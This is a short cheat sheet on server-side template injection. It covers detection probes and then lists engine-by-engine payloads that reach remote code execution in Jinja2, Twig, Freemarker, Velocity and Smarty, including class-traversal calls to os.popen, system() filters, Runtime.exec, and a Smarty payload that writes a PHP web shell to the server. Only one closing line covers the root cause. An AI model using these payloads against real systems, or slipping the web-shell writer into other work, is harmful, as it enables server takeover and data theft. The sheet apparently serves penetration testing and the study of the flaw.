# SSTI (Server-Side Template Injection) Reference

## Attack Surface Signals
- Dynamic message rendering: Welcome emails, notification templates, custom invoices, dynamic web pages.
- Template engines: Jinja2 / Flask, Twig / Symfony, Smarty, Freemarker, Velocity, Pebble, ERB (Ruby).

## Detection Polyglot & Math Identification
Test input: `${{<%[%'"}}%\` followed by mathematical expressions:
- `{{7*7}}` -> `49` (Jinja2, Twig, Django, Smarty, Vue)
- `${7*7}` -> `49` (Freemarker, Velocity, JSP EL, Spring)
- `<%= 7*7 %>` -> `49` (ERB)
- `#{7*7}` -> `49` (Ruby / Thymeleaf)

## Engine-Specific Exploitation to RCE
1. **Jinja2 (Python)**:
   - MRO class traversal:
     `{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}`
     `{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}`
     `{{ ''.__class__.__mro__[1].__subclasses__()[<index>]('id',shell=True,stdout=-1).communicate()[0] }}`
2. **Twig (PHP)**:
   - `{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("id")}}`
   - `{{['id']|filter('system')}}`
3. **Freemarker (Java)**:
   - `<#assign ex="freemarker.template.utility.Execute"?new()>${ ex("id") }`
4. **Velocity (Java)**:
   - `#set($e="") #set($rt=$e.getClass().forName("java.lang.Runtime")) #set($chr=$e.getClass().forName("java.lang.Character")) #set($str=$e.getClass().forName("java.lang.String")) $rt.getRuntime().exec("id")`
5. **Smarty (PHP)**:
   - `{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['cmd']); ?>",self::clearConfig())}`
   - `{system('id')}`

## Common Root Causes
- Passing user-controlled strings directly into `render_template_string()` or template compilation functions instead of passing data as template context variables.
